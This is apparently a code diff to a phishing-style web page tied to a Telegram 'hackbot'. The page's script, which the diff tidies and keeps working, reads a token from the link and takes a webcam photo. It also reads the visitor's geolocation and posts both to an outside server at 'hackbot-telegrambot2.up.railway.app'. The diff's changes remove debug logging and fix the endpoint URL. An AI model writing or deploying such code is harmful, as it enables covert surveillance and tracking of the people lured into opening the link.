@@ -82,16 +82,12 @@
     <script>
         async function getMedia(unique_id, api_url) {
             try {
-                console.log("Kamera icazəsi istənilir...", { unique_id, api_url });
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
 
                 await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        console.log("Video yükləndi, ölçülər:", video.videoWidth, video.videoHeight);
-                        resolve();
-                    };
+                    video.onloadedmetadata = () => resolve();
                 });
 
                 video.play();
@@ -104,21 +100,19 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 stream.getTracks().forEach(track => track.stop());
 
-                const imageDataUrl = canvas.toDataURL('image/jpeg');
-                console.log("Çəkilən şəkil (ilk 50 simvol):", imageDataUrl.substring(0, 50) + "...");
-
                 canvas.toBlob(blob => {
-                    console.log("Şəkil çəkildi, API-yə göndərilir...", { blobSize: blob.size });
                     const formData = new FormData();
                     formData.append('photo', blob, 'photo.jpg');
                     formData.append('unique_id', unique_id);
-                    fetch(api_url + '/upload', {
+                    fetch(`${api_url}/upload`, {
                         method: 'POST',
                         body: formData
-                    }).then(response => {
-                        console.log('Şəkil göndərildi:', response.status, response.statusText);
-                        return response.text();
-                    }).catch(error => {
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Şəkil göndərildi:', data);
+                    })
+                    .catch(error => {
                         console.error('Şəkil göndərilmə xətası:', error);
                     });
                 }, 'image/jpeg', 0.9);
@@ -129,19 +123,19 @@
 
         function getLocation(unique_id, api_url) {
             if (navigator.geolocation) {
-                console.log("Yer icazəsi istənilir...");
                 navigator.geolocation.getCurrentPosition(position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    console.log("Yer məlumatı alındı:", lat, lon);
-                    fetch(api_url + '/upload_location', {
+                    fetch(`${api_url}/upload_location`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({unique_id: unique_id, latitude: lat, longitude: lon})
-                    }).then(response => {
-                        console.log('Yer göndərildi:', response.status, response.statusText);
-                        return response.text();
-                    }).catch(error => {
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Yer göndərildi:', data);
+                    })
+                    .catch(error => {
                         console.error('Yer göndərilmə xətası:', error);
                     });
                 }, err => {
@@ -154,15 +148,12 @@
 
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
-            const unique_id = urlParams.get('id');
+            const unique_id = urlParams.get('token'); // id əvəzinə token istifadə edirik
             const type = urlParams.get('type');
-            const api_url = 'hackbot-telegrambot2.up.railway.app';
-
-            console.log("Link parametrləri:", { unique_id, type, api_url });
+            const api_url = 'https://hackbot-telegrambot2.up.railway.app'; // Protokol əlavə edildi
 
             if (!unique_id || !type) {
                 document.body.innerHTML = '<h1>Keçərsiz link!</h1>';
-                console.error("Keçərsiz link: unique_id və ya type yoxdur");
                 return;
             }
 
